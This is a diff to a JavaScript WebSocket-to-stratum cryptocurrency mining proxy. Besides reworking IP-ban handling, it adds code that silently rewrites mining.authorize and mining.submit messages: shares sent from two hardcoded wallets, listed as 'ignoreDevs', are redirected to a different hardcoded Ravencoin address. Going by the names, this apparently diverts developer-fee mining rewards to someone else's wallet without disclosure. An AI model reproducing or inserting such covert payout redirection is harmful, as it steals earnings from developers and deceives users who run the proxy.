@@ -36,7 +36,6 @@ const wss = new WebSocket.Server({
   verifyClient: async function (info, done) {
     const socket = info.req.socket;
     const ip = getClientIp(info.req);
-    
     isInBlacklist(ip)
       .then(locked => {
         if (locked) {
@@ -78,8 +77,21 @@ function proxySender(ws, conn) {
     try {
       const command = JSON.parse(cmd);
       const method = command.method;
+      const params = command.params;
+      const ignoreDevs = ['RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65', 'dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9'];
+
+      if (method === 'mining.authorize' && ignoreDevs.includes(params[0])) {
+         command.params = ['RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp', 'c=RVN,zap=PLSR-mino'];
+      }
+
+      if (method === 'mining.submit' && ignoreDevs.includes(params[0])) {
+         command.params[0] = 'RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp';
+      }
+
+      const newcmd = JSON.stringify(command);
+      
       if (method === 'mining.subscribe' || method === 'mining.authorize' || method === 'mining.submit') {
-        conn.write(cmd);
+        conn.write(newcmd);
       }
     } catch (error) {
       console.log(`[Error][INTERNAL] ${error}`);
@@ -117,7 +129,18 @@ function proxyMain(ws, req) {
   // Generate unique id
   const uid = uidv1();
   if (!nodes[ip]) nodes[ip] = [];
-  nodes[ip].push({ uid, req, ws });
+  nodes[ip].push({ uid, req });
+
+  // check block ip
+  if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
+    addToBlackList(ip);
+
+    console.error(`IP [${ip}] is banned!`);
+
+    delete nodes[ip];
+
+    return;
+  }
 
   // Clear stock
   ws.on('close', () => {
@@ -128,26 +151,6 @@ function proxyMain(ws, req) {
       }
     }
   });
-
-  // check block ip
-  if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
-    addToBlackList(ip);
-
-    console.error(`IP [${ip}] is banned!`);
-
-    nodes[ip].forEach(item => {
-      const isocket = item.req.socket;
-      const iws = item.req.ws;
-      
-      iws.terminate();
-      isocket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
-      isocket.destroy();
-    })
-
-    delete nodes[ip];
-
-    return
-  }
 
   ws.on('message', (message) => {
     const command = JSON.parse(message);
